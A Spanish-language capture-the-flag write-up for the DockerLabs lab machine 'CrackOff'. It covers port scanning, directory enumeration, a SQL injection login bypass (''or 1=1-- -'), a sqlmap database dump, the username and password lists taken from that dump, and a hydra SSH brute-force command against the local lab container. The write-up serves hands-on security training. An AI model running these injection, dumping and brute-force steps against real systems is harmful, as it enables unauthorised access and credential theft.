# MACHINE CRACKOFF

## INFORMACIÓN GENERAL

- **Plataforma**: DockerLabs
- **Sistema Operativo**: Linux
- **Dificultad**: Dificl

![machine_crackoff_dl]()

## DESPLIEGUE
```python
bash autodeploy.sh crackoff.tar
```
![despliegue](https://github.com/Jean25-sys/CTFs_Wintxx./blob/main/Writeups/dockerlabs/images/findyourstyle/DESPLIEGUE.png)


## RECONOCIMIENTO
Para poder ver puertos abiertos y las versiones de los servicios que estan corriendo por detrás
```ruby
nmap -p- --open -sS --min-rate 5000 -vvvv -n -Pn -sCV 172.17.0.2
```
```ruby
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3d:fc:bd:41:cb:81:e8:cd:a2:58:5a:78:68:2b:a3:04 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNuJZkQSLJmcZX14n7uNiUBZ/Li3VabQ8/HRKIsPXb/9CZmDhjdBLLRgvjL9NpgVgU2gGEFTSkljIn0SGcgaoIY=
|   256 d8:5a:63:27:60:35:20:30:a9:ec:25:36:9e:50:06:8d (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINZLckodawlUx1KSiq+zaADv0w1jbQwrlE98GYdEY/jH
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.58 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: CrackOff - Bienvenido
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Podemos observar que tenemos 2 puertos abiertos:
- **80 - HTTP** : Servicio Web
- **22 - SSH** : Servicio usado mayormente para autenticación remota

A partir de estos 2 puertos podemos inciar una busqueda de vectores de ataques, primero vamos a echarle un vistazo al puerto `HTTP - 80` 

![web_port80] 

Podemos observar un Inicio de Sesión lo que indica que podemos probar ataques por esa manera, pero para tener la mayor informacion posible vamos a hacer un escaneo de directorios ocultos con `Gobuster`

![Gobuster_enumeration]()

Podemos observar que tenemos unos cuantos directorios, aprovecho que le den una mirada a una tool que eh creado en bash para poder ver que contiene cada ruta en forma de screenshoots

Link: [DirbScreen](https://github.com/Harley25-sys/dirb_screen)

Esta herramienta lo que hace es visita a cada una de las rutas encontradas, accede a ella y les toma una captura de pantalla a lo que se muestra de primera y lo almacena en una carpetilla, ideal para cuanto nos topamos con
una gran cantidad de directorios para solo hacer una visualizacion rápida de cada screenshot y visitar los sitios potenciales a vulnerabilidades

Le aplicamos la limpieza necesaria de tal manera que solo queden las rutas:
![result_limpios]()

Ahora ejecutamos el script y le pasamos los resultados limpios:
![dirb_screen]()

Una vez terminada la ejecucion podemos ver las capturas almacenadas en las carpetas 
![resultados_dirbscreen]()
Como podemos ver, son capturas de pantalla de cada ruta y podemos visualizarlas 1 a 1, para este caso nuestro vector de ataque es el `Login`

![crack_off_login]()

Entonces como no tenemos muchas pistas, intentamos hacer una `sqli` muy basica para comprobar si es vulnerable a un Inyección
```ruby
username: 'or 1=1-- -
password: 'or 1=1-- -
```
![sqli_login]()

Y si hacemos esto, podemos ganar acceso al panel de `administrador`, entonces podemos hacer `sqli` para poder dumpear la base de datos que se encuentra por detrás
![panel_admin]()

Vamos a recurrir a `CAIDO` para capturar esta request y utilizarlo para dumpear la base de datos con `sqlmap`
Este comando automatiza toda la enumeracion de BD, Tablas, Columnas y volca toda la base de datos vulnerable
```ruby
sqlmap -r req --dump -batch --level 5 -risk 3a
```
![sql_dump]()

Como observamos una cantidad de `usuarios` con cierta cantidad de `contraseñas`, se nos viene a la mente probar `brute force` pero como no tenemos otro vector de ataque en `web` lo haremos en el otro puerto que tenemos abierto 
que es el `ssh`

Usuarios
```
rejetto
tomitoma
alice
whoami
pip
rutus
jazmin
rosa
mario
veryhardpassword
root
admin
```

Contraseñas
```
password123
alicelaultramejor
passwordinhack
supersecurepasswordultra
estrella_big
colorcolorido
ultramegaverypasswordhack
unbreakroot
happypassword
admin12345password
carsisgood
badmenandwomen
```

Ahora probamos la fuerza bruta por el puerto ssh:
```python
hydra -L users.txt -P passwords.txt 172.17.0.2 ssh
```

![hydra]()
